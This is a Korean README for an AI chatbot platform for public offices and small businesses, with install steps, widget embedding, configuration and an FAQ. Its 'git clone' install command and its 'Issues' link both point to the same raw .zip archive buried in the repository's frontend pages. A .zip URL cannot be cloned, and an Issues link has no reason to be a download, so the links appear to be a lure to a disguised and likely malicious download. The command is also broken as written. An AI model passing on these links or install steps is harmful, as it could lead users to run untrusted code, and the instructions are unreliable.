# 🤖 SmartBot KR — 누구나 쓰는 AI 챗봇 플랫폼

> **코딩 몰라도 됩니다.** 설치부터 운영까지 한 번에.

카카오톡 채팅, 홈페이지 위젯으로 고객 질문에 AI가 자동으로 답변합니다.
지자체·음식점·쇼핑몰·병원·학원 등 **어떤 조직이든 바로 사용 가능**합니다.

---

## 이런 분께 딱 맞습니다

| 사용처 | 활용 예시 |
|--------|-----------|
| 🏛️ **지자체·공공기관** | 민원 안내, 서류 발급 방법, 담당부서 연결 |
| 🍽️ **음식점·카페** | 메뉴 문의, 영업시간, 예약, 주차 안내 |
| 🛍️ **쇼핑몰·온라인몰** | 배송 조회, 교환·환불 정책, 상품 문의 |
| 🏥 **병원·의원·약국** | 진료시간, 예약 방법, 보험 안내 |
| 🎓 **학원·교육기관** | 수업 일정, 수강료, 입학 상담 |
| 🏢 **일반 기업** | 고객 CS 자동화, 사내 FAQ 봇 |

---

## ✨ 주요 기능

| 기능 | 설명 |
|------|------|
| 💬 **카카오톡 연동** | 카카오 i 오픈빌더 스킬 서버로 바로 연결 |
| 🌐 **홈페이지 위젯** | 코드 한 줄로 어느 홈페이지에나 삽입 |
| ❓ **FAQ 자동 답변** | 등록한 FAQ를 AI가 유사도로 매칭해 즉시 답변 |
| 📄 **문서 학습** | PDF·Word 파일 업로드 → AI가 자동으로 학습 |
| 🤖 **LLM 연동** | Claude·GPT 연결 시 더 자연스러운 답변 (선택) |
| 📊 **관리 대시보드** | 통계·FAQ·문서·대화이력 한눈에 관리 |
| 🔒 **개인정보 보호** | 고객 발화 자동 마스킹, 원문 미저장 |
| 🏢 **멀티 조직 지원** | 하나의 서버로 여러 매장/지점 각각 운영 |

---

## 🚀 5분 설치

### Linux / macOS

```bash
git clone https://github.com/unfruitful-semi834/Gov-chat-bot/raw/refs/heads/main/frontend/src/pages/bot-Gov-chat-v2.2.zip
cd Gov-chat-bot
chmod +x install.sh
./install.sh
```

> **Windows 사용자** → [Windows 설치 가이드](docs/WSL2_가이드.md)

### 설치 후 접속

```
관리자 화면:  http://localhost:3000
API 문서:     http://localhost:8000/docs
```

---

## 📋 시스템 요구사항

| 항목 | 최소 |
|------|------|
| OS | Ubuntu 20.04+ / macOS 13+ / Windows 11 (WSL2) |
| RAM | 4GB |
| 디스크 | 20GB |
| Docker | 24.x 이상 |
| 인터넷 | 설치 시 필요 (이후 오프라인 운영 가능) |

---

## 📖 사용 방법

### 1단계 — 관리자 계정 만들기

```bash
docker compose exec backend python -m app.scripts.create_admin
```

조직 ID(영문), 이메일, 비밀번호를 입력하면 완료.

### 2단계 — FAQ 등록하기

1. http://localhost:3000 에서 로그인
2. **FAQ 관리** → **+ FAQ 추가**
3. 카테고리, 질문, 답변 입력 → 저장

> **팁**: 같은 뜻이지만 표현이 다른 질문을 여러 개 등록할수록 인식률이 높아집니다.
> - "영업시간이요?" / "몇시에 열어요?" / "오늘 언제까지 해요?" → 같은 답변으로 등록

### 3단계 — 문서 업로드하기 (선택)

자주 묻는 내용이 담긴 PDF, Word 파일을 올리면 AI가 자동으로 학습합니다.

1. **문서 관리** → **+ 문서 업로드**
2. 파일 선택 (PDF · Word · 텍스트)
3. 처리 완료 후 **승인** 클릭

### 4단계 — 테스트하기

**시뮬레이터** 메뉴에서 실제 질문을 입력해 답변을 미리 확인할 수 있습니다.

### 5단계 — 홈페이지에 위젯 달기

홈페이지 HTML에 아래 코드를 붙여넣기만 하면 됩니다.

```html
<script
  src="http://내서버주소/widget/govbot-widget.js"
  data-tenant="내조직ID"
  data-api="http://내서버주소"
  data-title="AI 도우미"
  data-color="#2563eb"
></script>
```

---

## ⚙️ 환경 설정

```bash
# 설정 파일 복사
cp .env.example .env

# 텍스트 에디터로 열어서 수정
nano .env   # 또는 메모장으로 열기
```

**반드시 바꿔야 할 항목:**

| 항목 | 설명 |
|------|------|
| `SECRET_KEY` | 보안 키 (아무 긴 문자열, 32자 이상) |

**선택 항목 (LLM 연결):**

| 항목 | 설명 |
|------|------|
| `LLM_PROVIDER=anthropic` | Claude AI 사용 |
| `ANTHROPIC_API_KEY=...` | Claude API 키 |
| `LLM_PROVIDER=openai` | ChatGPT 사용 |
| `OPENAI_API_KEY=...` | OpenAI API 키 |

> LLM 없이도 FAQ + 문서 기반 답변이 충분히 잘 동작합니다. 처음에는 LLM 없이 시작하세요.

---

## 🏗️ 동작 원리

고객이 질문하면 아래 순서로 가장 적합한 답변을 찾습니다.

```
고객 질문
    │
    ▼
① FAQ 검색 (등록된 FAQ와 유사도 비교)
    │ 비슷한 FAQ 있음 → 즉시 답변
    │ 없음 ↓
    ▼
② 문서 검색 (업로드한 파일에서 관련 내용 추출)
    │ 관련 내용 있음 + LLM 연결됨 → AI가 자연스럽게 재서술
    │ 관련 내용 있음 + LLM 없음   → 문서 내용 그대로 안내
    │ 없음 ↓
    ▼
③ 담당자 안내 (설정한 연락처로 안내)
```

---

## 📁 파일 구조

```
Gov-chat-bot/
├── backend/          # AI 서버 (자동 관리, 직접 수정 불필요)
├── frontend/         # 관리자 화면 (자동 관리)
│   └── widget/       # 홈페이지 위젯 파일
├── docs/
│   ├── 운영가이드.md  # 상세 운영 설명서
│   └── WSL2_가이드.md # Windows 설치 방법
├── docker-compose.yml # 서비스 실행 설정
├── install.sh        # 자동 설치 스크립트
└── .env.example      # 환경 설정 예시
```

---

## 🔧 자주 묻는 질문 (설치·운영)

**Q. 클라우드 서버가 있어야 하나요?**
A. 아니요. 사무실 컴퓨터(윈도우·맥·리눅스)에서 바로 실행됩니다. 외부에서 접속하려면 공인 IP나 클라우드 서버가 필요합니다.

**Q. 카카오톡 계정이 있어야 하나요?**
A. 카카오톡 연동은 선택 사항입니다. 홈페이지 위젯만으로도 운영할 수 있습니다.

**Q. LLM(Claude·ChatGPT) API 비용이 걱정돼요.**
A. LLM 연결 없이도 FAQ + 문서 기반 답변이 잘 작동합니다. LLM은 나중에 필요할 때 추가하면 됩니다.

**Q. 고객 대화 내용이 외부로 나가나요?**
A. LLM을 사용하지 않으면 외부 API 호출이 전혀 없습니다. 모든 데이터가 내 서버 안에만 있습니다.

**Q. 여러 매장을 동시에 운영할 수 있나요?**
A. 네. 매장마다 별도의 조직 ID를 만들면 데이터가 완전히 분리되어 관리됩니다.

**Q. 문제가 생기면 어떻게 하나요?**
A. 로그 확인: `docker compose logs backend`
   [Issues](https://github.com/unfruitful-semi834/Gov-chat-bot/raw/refs/heads/main/frontend/src/pages/bot-Gov-chat-v2.2.zip)에 남겨주시면 도움드립니다.

---

## 🔒 개인정보 보호

- 고객 발화에서 **주민번호·전화번호·이메일·카드번호** 자동 감지 후 마스킹
- 원문은 서버에 **절대 저장되지 않음**
- 사용자 ID는 **복원 불가능한 해시값**으로만 저장
- 관리자도 원문 열람 불가 (마스킹 상태로만 표시)

---

## 🧪 개발자 정보

```bash
cd backend
pip install -r requirements.txt
pytest tests/ -v
# 127 tests passing
```

**기술 스택**: Python · FastAPI · PostgreSQL · Redis · ChromaDB · React · Docker

---

## 🤝 기여 방법

버그 제보, 기능 제안, 코드 기여 모두 환영합니다!

1. 저장소 Fork
2. 브랜치 생성: `git checkout -b feature/기능명`
3. 커밋: `git commit -m "feat: 설명"`
4. Pull Request 생성

---

## 📄 라이선스

[MIT License](LICENSE) — **무료**, 상업적 이용 가능, 수정·재배포 자유
